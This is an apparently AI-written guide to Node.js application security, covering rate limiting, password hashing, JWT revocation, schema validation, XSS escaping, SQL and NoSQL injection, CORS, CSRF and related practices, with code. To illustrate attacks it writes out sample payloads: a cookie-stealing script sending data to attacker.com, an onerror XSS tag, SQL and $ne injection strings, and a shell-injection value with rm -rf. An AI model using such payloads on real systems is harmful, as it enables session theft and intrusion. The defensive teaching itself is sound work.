Absolutely. For a production Node.js application, security should be handled in **layers**. No single technique—JWT, ORM, rate limiting, etc.—is enough by itself.

I'll explain each item as:

**Problem/Cause → Attack example → Solution → Node.js code → Production notes**

I'll also add some important missing practices at the end.

---

# Node.js Security Best Practices

## High-level security flow

```text
Client Request
      |
      v
[ HTTPS / Reverse Proxy ]
      |
      v
[ Rate Limiting ]
      |
      v
[ Security Headers ]
      |
      v
[ Body Size Limit ]
      |
      v
[ Authentication ]
      |
      v
[ Authorization ]
      |
      v
[ Input Validation ]
      |
      v
[ Sanitization / Escaping ]
      |
      v
[ Application Logic ]
      |
      v
[ ORM / Parameterized Queries ]
      |
      v
[ Database ]
```

A good principle is:

> **Never trust input from the client. Validate it, sanitize it where appropriate, authorize the action, and safely handle it before using it.**

---

# 1. Rate Limiting

## Problem

Without rate limiting, an attacker can repeatedly call your APIs.

For example:

```text
POST /login
POST /login
POST /login
POST /login
POST /login
...
```

This can cause:

* Brute-force password attacks
* OTP guessing
* API abuse
* Resource exhaustion
* Increased database load
* Denial-of-service attempts

---

## Bad implementation

```js
app.post("/login", loginController);
```

A malicious user can potentially make thousands of requests per second.

---

## Basic solution with `express-rate-limit`

```bash
npm install express-rate-limit
```

```js
const express = require("express");
const rateLimit = require("express-rate-limit");

const app = express();

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  message: {
    success: false,
    message: "Too many requests. Please try again later."
  },
  standardHeaders: true,
  legacyHeaders: false
});

app.use("/api", apiLimiter);
```

This means approximately:

```text
One client
    |
    |---- 100 requests / 15 minutes
    |
    +---- 101st request → 429 Too Many Requests
```

---

## Login should have stricter rate limiting

```js
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: {
    message: "Too many login attempts. Try again later."
  }
});

app.post("/login", loginLimiter, loginController);
```

---

## Important production problem: multiple Node.js servers

Suppose:

```text
                Load Balancer
                /           \
               v             v
          Node Server 1   Node Server 2
```

If rate-limit data is stored in Node.js memory:

```js
const requests = {};
```

then each server has different data.

An attacker could hit:

```text
Server 1 → 5 requests
Server 2 → 5 requests
Server 3 → 5 requests
```

So production applications should use a **shared store**, typically Redis.

```text
Node 1 ----\
Node 2 ----- Redis
Node 3 ----/
```

Conceptually:

```text
user/IP → Redis counter
```

Redis provides shared rate-limit state across multiple instances.

### Rate limit by what?

Depending on the endpoint:

* Public API → IP
* Login → IP + username/email
* Authenticated API → user ID/API key
* Expensive endpoint → user ID + stricter limit

Don't blindly rate-limit only by IP. Many legitimate users may share one public IP.

---

# 2. Password Encryption → Actually Password Hashing

A very important distinction:

> **Passwords should generally be hashed, not encrypted.**

## Encryption

Encryption is reversible:

```text
Password
   ↓
Encrypt
   ↓
Encrypted Data
   ↓ decrypt
Original Password
```

## Hashing

Password hashing is one-way:

```text
Password
   ↓
bcrypt / Argon2
   ↓
Hash
```

You should never need to recover the original password.

---

## Why normal hashing is not enough

Don't do:

```js
const crypto = require("crypto");

const hash = crypto
  .createHash("sha256")
  .update(password)
  .digest("hex");
```

SHA-256 is designed to be **fast**.

Fast hashing is bad for passwords because attackers can try huge numbers of guesses.

Use a password hashing algorithm such as:

* Argon2
* bcrypt
* scrypt

---

## Example using bcrypt

```bash
npm install bcrypt
```

### Registration

```js
const bcrypt = require("bcrypt");

async function register(req, res) {
  try {
    const { email, password } = req.body;

    const saltRounds = 12;

    const passwordHash = await bcrypt.hash(
      password,
      saltRounds
    );

    await User.create({
      email,
      password: passwordHash
    });

    res.status(201).json({
      message: "User created successfully"
    });

  } catch (error) {
    res.status(500).json({
      message: "Registration failed"
    });
  }
}
```

Database:

```text
email              password
------------------------------------------------
test@gmail.com     $2b$12$xxxxxxxxxxxxxxxx
```

Never:

```text
test@gmail.com | MyPassword123
```

---

## Login

```js
async function login(req, res) {
  const { email, password } = req.body;

  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({
      message: "Invalid credentials"
    });
  }

  const isValidPassword = await bcrypt.compare(
    password,
    user.password
  );

  if (!isValidPassword) {
    return res.status(401).json({
      message: "Invalid credentials"
    });
  }

  res.json({
    message: "Login successful"
  });
}
```

### Important

Don't compare hashes manually:

```js
password === user.password
```

Use:

```js
await bcrypt.compare(password, user.password);
```

---

# 3. JWT Blacklisting / Token Revocation

## The problem with JWT

JWTs are usually stateless.

After login:

```text
User
  |
  v
Server creates JWT
  |
  v
Client stores JWT
```

Then:

```text
Client → JWT → Server verifies signature
```

The server doesn't necessarily store the token.

Now imagine:

```text
JWT expires in 7 days
```

The user logs out after 10 minutes.

But someone has stolen their JWT.

The stolen JWT may still work for almost 7 days.

This is the JWT revocation problem.

---

## Solution 1: JWT blacklist

Give every JWT a unique `jti`.

```js
const jwt = require("jsonwebtoken");
const crypto = require("crypto");

const token = jwt.sign(
  {
    userId: user.id,
    jti: crypto.randomUUID()
  },
  process.env.JWT_SECRET,
  {
    expiresIn: "15m"
  }
);
```

Payload:

```json
{
  "userId": "123",
  "jti": "unique-token-id",
  "iat": 123456,
  "exp": 123999
}
```

---

## Logout

Store the revoked token identifier in Redis.

Conceptually:

```text
Redis:

blacklist:<jti> = true
TTL = remaining JWT lifetime
```

Example:

```js
async function logout(req, res) {
  const token = req.token;

  const decoded = jwt.decode(token);

  const remainingTime =
    decoded.exp - Math.floor(Date.now() / 1000);

  if (remainingTime > 0) {
    await redis.set(
      `blacklist:${decoded.jti}`,
      "true",
      {
        EX: remainingTime
      }
    );
  }

  res.json({
    message: "Logged out successfully"
  });
}
```

---

## Authentication middleware

```js
async function authenticate(req, res, next) {
  try {
    const authHeader = req.headers.authorization;

    if (!authHeader?.startsWith("Bearer ")) {
      return res.status(401).json({
        message: "Authentication required"
      });
    }

    const token = authHeader.split(" ")[1];

    const decoded = jwt.verify(
      token,
      process.env.JWT_SECRET
    );

    const blacklisted = await redis.get(
      `blacklist:${decoded.jti}`
    );

    if (blacklisted) {
      return res.status(401).json({
        message: "Token has been revoked"
      });
    }

    req.user = decoded;
    req.token = token;

    next();

  } catch (error) {
    return res.status(401).json({
      message: "Invalid or expired token"
    });
  }
}
```

---

## Better production approach: short-lived access token + refresh token

Usually:

```text
Access Token
├── Short lifetime: 5–15 minutes
└── Used for API requests

Refresh Token
├── Longer lifetime
├── Stored securely
└── Used to obtain new access tokens
```

```text
Login
  |
  +--> Access Token (15 min)
  |
  +--> Refresh Token (7 days)
```

On logout or compromise:

```text
Revoke refresh token
```

Then the maximum access-token exposure is relatively short.

### Production recommendation

Don't blacklist every access token unless you have a specific need for immediate access-token revocation.

A common design is:

```text
Short-lived access JWT
        +
Rotating/revocable refresh tokens
```

---

# 4. JSON Schema Validation

## Problem

Never trust:

```js
req.body
```

For example:

```json
{
  "email": "test@gmail.com",
  "password": "123",
  "role": "admin",
  "isAdmin": true
}
```

Your application might only expect:

```json
{
  "email": "test@gmail.com",
  "password": "SecurePassword123"
}
```

Unexpected fields can create security problems.

---

## Bad example

```js
await User.create(req.body);
```

Suppose the client sends:

```json
{
  "email": "attacker@test.com",
  "password": "password",
  "role": "admin"
}
```

If your model accepts `role`, you've potentially created an admin.

This is often called a **mass assignment** problem.

---

## Example using Ajv

```bash
npm install ajv
```

```js
const Ajv = require("ajv");

const ajv = new Ajv();

const registerSchema = {
  type: "object",

  properties: {
    email: {
      type: "string"
    },

    password: {
      type: "string",
      minLength: 8,
      maxLength: 128
    }
  },

  required: ["email", "password"],

  additionalProperties: false
};

const validateRegister =
  ajv.compile(registerSchema);
```

Middleware:

```js
function validateBody(validate) {
  return (req, res, next) => {
    const valid = validate(req.body);

    if (!valid) {
      return res.status(400).json({
        message: "Invalid request",
        errors: validate.errors
      });
    }

    next();
  };
}
```

Usage:

```js
app.post(
  "/register",
  validateBody(validateRegister),
  register
);
```

Now this:

```json
{
  "email": "test@gmail.com",
  "password": "Password123",
  "role": "admin"
}
```

will fail because:

```js
additionalProperties: false
```

---

## Validate more than request body

Validate:

```text
req.body
req.params
req.query
headers where applicable
webhook payloads
external API data
queue messages
configuration/environment values
```

For example:

```js
GET /users/abc
```

If you expect a UUID:

```js
const paramsSchema = {
  type: "object",

  properties: {
    id: {
      type: "string",
      format: "uuid"
    }
  },

  required: ["id"],
  additionalProperties: false
};
```

---

## Validation vs sanitization

These are different.

### Validation

```text
Is this input allowed?
```

Example:

```text
password must have minimum 8 characters
```

### Sanitization

```text
Remove or transform unsafe data
```

Example:

```html
<script>alert("XSS")</script>
```

Sanitization may remove dangerous HTML.

You often need **both**, depending on the data.

---

# 5. Escaping HTML and CSS — Preventing XSS

## The problem

Suppose you store user input:

```html
<script>
  fetch("https://attacker.com?cookie=" + document.cookie)
</script>
```

Then later display it in your application.

This can lead to **Cross-Site Scripting (XSS)**.

---

## Dangerous example

Suppose your backend generates HTML:

```js
const html = `
  <div>
    Hello ${req.body.name}
  </div>
`;
```

Input:

```html
<img src=x onerror="alert('XSS')">
```

Result:

```html
<div>
  Hello <img src=x onerror="alert('XSS')">
</div>
```

The browser interprets the HTML.

---

## Solution 1: Escape HTML

```js
function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

Usage:

```js
const safeName = escapeHtml(req.body.name);

const html = `
  <div>Hello ${safeName}</div>
`;
```

Input:

```html
<img src=x onerror="alert('XSS')">
```

Output:

```html
&lt;img src=x onerror=&quot;alert('XSS')&quot;&gt;
```

Now it is displayed as text.

---

## Better rule: escape according to context

Different contexts need different protection:

```text
HTML text
HTML attribute
URL
JavaScript
CSS
SQL
```

For example, this is not a good idea:

```js
<script>
  const name = "${userInput}";
</script>
```

The escaping requirements for JavaScript context are different from HTML context.

So the best solution is usually:

> Avoid manually concatenating untrusted input into HTML, JavaScript, CSS, or SQL.

---

## React and Vue

Normally:

```jsx
<div>{userInput}</div>
```

and:

```html
<div>{{ userInput }}</div>
```

escape output by default.

But dangerous patterns include:

### React

```jsx
<div
  dangerouslySetInnerHTML={{
    __html: userInput
  }}
/>
```

### Vue

```html
<div v-html="userInput"></div>
```

Only render user-provided HTML after proper sanitization.

For example, a library such as DOMPurify is commonly used when you intentionally support limited HTML.

---

## CSS injection

Suppose you allow users to control CSS:

```js
element.style.cssText = req.body.css;
```

Don't allow arbitrary CSS from untrusted users.

Instead use an allowlist:

```js
const allowedThemes = {
  light: {
    className: "theme-light"
  },

  dark: {
    className: "theme-dark"
  }
};

const theme = allowedThemes[req.body.theme];

if (!theme) {
  throw new Error("Invalid theme");
}
```

Better:

```text
User sends "dark"
       ↓
Validate allowlist
       ↓
Apply predefined CSS class
```

Not:

```text
User sends arbitrary CSS
       ↓
Inject directly into page
```

---

# 6. ORM/ODM Against Injection

ORM/ODM helps, but:

> **Using an ORM does not automatically make your application safe.**

---

# SQL Injection

## Dangerous raw SQL

```js
const query = `
  SELECT *
  FROM users
  WHERE email = '${req.body.email}'
`;
```

Attacker input:

```text
' OR '1'='1
```

Potential result:

```sql
SELECT *
FROM users
WHERE email = '' OR '1'='1'
```

---

## Solution: ORM query

Example conceptually with Sequelize:

```js
const user = await User.findOne({
  where: {
    email: req.body.email
  }
});
```

The ORM parameterizes values.

---

## If using raw SQL, parameterize

For example:

```js
const result = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [email]
);
```

Never:

```js
`SELECT * FROM users WHERE email = '${email}'`
```

---

# MongoDB / NoSQL Injection

This is important for ODMs like Mongoose.

Suppose login code is:

```js
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password
});
```

An attacker may send an object instead of a string:

```json
{
  "email": {
    "$ne": null
  },
  "password": {
    "$ne": null
  }
}
```

That can alter the meaning of the query.

---

## Solution: validate types

Your JSON schema should require:

```js
email: {
  type: "string"
}
```

Then reject:

```json
{
  "email": {
    "$ne": null
  }
}
```

because it's an object, not a string.

Also avoid directly passing arbitrary request objects into database filters:

```js
// Dangerous
User.find(req.query);
```

Prefer explicitly constructing filters:

```js
const filter = {};

if (typeof req.query.status === "string") {
  filter.status = req.query.status;
}

const users = await User.find(filter);
```

Even better: validate the allowed query parameters first.

---

# 7. Security Linter

A security linter performs static analysis and can detect risky code patterns before production.

It can find things like:

```text
Hardcoded secrets
eval()
dangerous regular expressions
unsafe child processes
weak crypto
possible injection patterns
```

---

## ESLint

Install:

```bash
npm install --save-dev eslint
```

A useful security plugin is:

```bash
npm install --save-dev eslint-plugin-security
```

Example configuration:

```js
module.exports = {
  plugins: ["security"],

  extends: [
    "plugin:security/recommended"
  ]
};
```

Now this:

```js
eval(req.body.code);
```

should immediately raise concern during development/linting.

Run:

```bash
npx eslint .
```

---

## Dangerous code examples

### `eval`

```js
eval(req.body.expression);
```

An attacker could potentially execute arbitrary JavaScript.

Avoid it.

---

### Unsafe command execution

Dangerous:

```js
const { exec } = require("child_process");

exec(`ls ${req.query.directory}`);
```

Input:

```text
; rm -rf something
```

The exact exploit depends on OS and shell, but the core problem is:

> Untrusted input is being interpreted by a shell.

Prefer APIs that avoid shell interpretation and use strict allowlists.

---

# 8. Security Headers

You didn't mention this, but it's important.

Use Helmet:

```bash
npm install helmet
```

```js
const helmet = require("helmet");

app.use(helmet());
```

Helmet helps configure several HTTP security headers.

Conceptually:

```text
Browser
   |
   v
Security Headers
   |
   +-- Reduce clickjacking risk
   +-- Help control script sources
   +-- Disable dangerous browser behavior
```

For production, configure a Content Security Policy based on your application's actual frontend requirements rather than blindly assuming one configuration fits every app.

---

# 9. HTTPS Everywhere

Passwords, JWTs, and API requests should not travel over plain HTTP in production.

```text
BAD

Client
  |
 HTTP
  |
Server
```

Use:

```text
GOOD

Client
  |
 HTTPS
  |
Load Balancer / Nginx
  |
 HTTP or HTTPS internally
  |
Node.js
```

For example:

```text
Internet
   |
   v
Nginx
   |
TLS terminated here
   |
   v
Node.js
```

If TLS terminates at a trusted reverse proxy/load balancer, configure the application appropriately for the proxy environment.

For Express:

```js
app.set("trust proxy", 1);
```

Only configure `trust proxy` correctly for your actual infrastructure. Don't blindly trust arbitrary proxies.

---

# 10. CORS Configuration

Don't do:

```js
app.use(cors());
```

without understanding which origins should access your API.

A more controlled approach:

```js
const cors = require("cors");

const allowedOrigins = [
  "https://app.example.com"
];

app.use(cors({
  origin(origin, callback) {
    if (!origin) {
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    callback(new Error("Origin not allowed"));
  },

  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: [
    "Content-Type",
    "Authorization"
  ]
}));
```

Important:

> CORS is primarily a browser access-control mechanism. It is not authentication or authorization.

Even if CORS is configured correctly, your server must still authenticate and authorize requests.

---

# 11. Request Body Size Limits

An attacker could send a huge request:

```text
10 GB JSON body
```

This can consume memory.

Configure limits:

```js
app.use(express.json({
  limit: "1mb"
}));

app.use(express.urlencoded({
  extended: true,
  limit: "1mb"
}));
```

For file uploads, also enforce:

```text
Maximum file size
Allowed MIME types
Allowed extensions
File count
Upload timeout
```

Never trust only the client-provided:

```text
Content-Type
```

for security-sensitive file validation.

---

# 12. Environment Variables and Secrets

Never:

```js
const JWT_SECRET = "my-secret-key";
const DB_PASSWORD = "password123";
```

Especially don't commit them to Git.

Use:

```js
process.env.JWT_SECRET
```

Example:

```env
JWT_SECRET=very-long-random-secret
DB_PASSWORD=secret
```

Add:

```text
.env
```

to:

```text
.gitignore
```

Also:

```text
Never log secrets
Never expose secrets to frontend
Rotate secrets when compromised
Use a secret manager in production when appropriate
```

---

# 13. Authentication Is Not Authorization

This is a very common production mistake.

Authentication asks:

```text
Who are you?
```

Authorization asks:

```text
Are you allowed to do this?
```

Suppose:

```text
DELETE /users/123
```

This is not enough:

```js
if (!req.user) {
  return res.status(401).json();
}

await User.deleteOne({
  id: req.params.id
});
```

Any authenticated user may potentially delete any user.

---

## Add authorization

```js
async function deleteUser(req, res) {
  if (req.user.role !== "admin") {
    return res.status(403).json({
      message: "Forbidden"
    });
  }

  await User.deleteOne({
    id: req.params.id
  });

  res.json({
    message: "User deleted"
  });
}
```

For resource ownership:

```js
const document = await Document.findById(
  req.params.id
);

if (!document) {
  return res.status(404).json();
}

if (document.userId !== req.user.userId) {
  return res.status(403).json({
    message: "You cannot access this document"
  });
}
```

This prevents **IDOR/BOLA-style** problems where someone changes:

```text
/documents/123
```

to:

```text
/documents/124
```

and accesses another user's resource.

---

# 14. Avoid Information Leakage

Bad production response:

```js
app.use((err, req, res, next) => {
  res.status(500).json({
    stack: err.stack,
    error: err.message
  });
});
```

The user may see:

```text
Database host
Internal file paths
SQL errors
Implementation details
```

Better:

```js
app.use((err, req, res, next) => {
  console.error(err);

  res.status(err.statusCode || 500).json({
    message:
      err.statusCode
        ? err.message
        : "Internal server error"
  });
});
```

In production:

```text
Detailed error → Logs / monitoring
Safe error message → Client
```

---

# 15. Dependency Security

Your application depends on hundreds or thousands of packages.

Check vulnerabilities:

```bash
npm audit
```

You can also use:

```text
Dependabot
Renovate
Snyk
GitHub security scanning
```

Be careful with:

```bash
npm audit fix --force
```

because forced upgrades can introduce breaking changes.

A better process is:

```text
Detect
  ↓
Understand severity/exposure
  ↓
Update package
  ↓
Run tests
  ↓
Deploy
```

Also avoid unnecessary dependencies.

Every dependency increases:

```text
Supply chain risk
Maintenance burden
Potential vulnerabilities
```

---

# 16. Prevent Prototype Pollution

Be careful when merging untrusted objects.

Potentially risky patterns:

```js
Object.assign(config, req.body);
```

or blindly deep-merging:

```js
merge(config, req.body);
```

Untrusted input containing special object keys may cause unexpected behavior in vulnerable libraries or unsafe merge implementations.

Better:

```js
const config = {
  theme:
    typeof req.body.theme === "string"
      ? req.body.theme
      : "light"
};
```

Again:

> Explicitly select the fields you accept.

---

# 17. Avoid ReDoS (Regular Expression Denial of Service)

Dangerous regular expressions can consume excessive CPU.

For example, a poorly designed regex processing attacker-controlled input can cause:

```text
Input
   ↓
Regex backtracking
   ↓
CPU reaches 100%
   ↓
Node.js event loop blocked
   ↓
Other requests become slow
```

Since CPU-heavy JavaScript can block the Node.js event loop, this can affect the whole process.

Be careful with complex nested quantifiers and test regexes against large malicious inputs.

Also enforce input length:

```js
if (req.body.value.length > 1000) {
  return res.status(400).json({
    message: "Input too long"
  });
}
```

---

# 18. CSRF Protection

This matters especially when authentication uses **cookies**.

Example:

```text
User logged into:
bank.com
```

Then visits:

```text
evil.com
```

The malicious site attempts to trigger a request to:

```text
bank.com/transfer
```

The browser may automatically include cookies depending on cookie settings.

Protection can include:

* CSRF tokens
* SameSite cookies
* Origin/Referer validation where appropriate
* Avoiding unnecessary state-changing cross-origin requests

Example cookie configuration:

```js
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict"
});
```

The exact `SameSite` value depends on whether your architecture requires legitimate cross-site behavior.

---

# Putting It Together: Secure Express Example

```js
const express = require("express");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");

const app = express();

// Reverse proxy configuration.
// Configure this based on your real infrastructure.
app.set("trust proxy", 1);

// Security headers
app.use(helmet());

// Limit request body size
app.use(express.json({
  limit: "1mb"
}));

// General API rate limiting
app.use("/api", rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
}));

// Login-specific rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: {
    message: "Too many login attempts"
  }
});

app.post(
  "/api/login",
  loginLimiter,
  validateBody(validateLogin),
  login
);

app.post(
  "/api/register",
  validateBody(validateRegister),
  register
);

app.get(
  "/api/profile",
  authenticate,
  getProfile
);

// Central error handler
app.use((err, req, res, next) => {
  console.error(err);

  res.status(err.statusCode || 500).json({
    message:
      err.statusCode
        ? err.message
        : "Internal server error"
  });
});

app.listen(3000);
```

---

# Production Security Architecture

For a production application, think of it like this:

```text
                         Internet
                            |
                            v
                     [ CDN / WAF ]
                            |
                            v
                     [ Load Balancer ]
                            |
                            v
                     [ Nginx / Proxy ]
                            |
                +-----------+-----------+
                |                       |
                v                       v
           Node.js App 1           Node.js App 2
                |                       |
                +-----------+-----------+
                            |
                     Shared Services
                            |
            +---------------+---------------+
            |               |               |
            v               v               v
         Redis           Database       Monitoring
            |
            +--> Rate limits
            +--> JWT revocation
            +--> Sessions/cache
```

---

# Security Checklist for Node.js Interviews

## Request security

* Validate `body`, `params`, and `query`
* Reject unexpected fields where appropriate
* Limit request body size
* Rate limit public and sensitive endpoints
* Validate file uploads
* Avoid dangerous regexes

## Password security

* Never store plain-text passwords
* Hash with Argon2, bcrypt, or scrypt
* Never decrypt passwords
* Use `compare()` for verification
* Use generic login errors

## JWT security

* Use strong signing keys
* Set expiration
* Prefer short-lived access tokens
* Use refresh-token rotation/revocation where appropriate
* Implement immediate revocation if required
* Don't put sensitive information inside JWT payloads

## Database security

* Use parameterized queries
* Don't concatenate SQL
* Validate NoSQL input types
* Don't pass `req.body` or `req.query` directly into DB operations
* Explicitly choose allowed fields

## XSS security

* Escape output according to context
* Avoid raw HTML rendering
* Sanitize intentionally allowed HTML
* Don't allow arbitrary CSS/JS
* Use security headers/CSP where appropriate

## Infrastructure

* HTTPS
* Secure cookies
* Correct reverse-proxy configuration
* CORS configured for your architecture
* Secrets outside source code
* Rotate compromised credentials

## Application security

* Authentication
* Authorization on every sensitive resource
* Prevent IDOR/BOLA
* Safe error responses
* Centralized logging and monitoring

## Development

* ESLint + security rules
* Dependency vulnerability scanning
* Regular package updates
* Secret scanning in CI
* Security tests for authentication and authorization

---

## Most important takeaway

A secure endpoint usually follows this order:

```text
Request
   ↓
Rate limit
   ↓
Parse with size limits
   ↓
Validate schema
   ↓
Authenticate
   ↓
Authorize
   ↓
Sanitize/escape when required by output context
   ↓
Use safe database query
   ↓
Return safe response
   ↓
Log/monitor security failures
```

This layered approach is the real production mindset. **Rate limiting protects availability, password hashing protects credentials, validation protects application boundaries, authorization protects resources, escaping/sanitization protects browser output, and parameterized database access protects queries.**
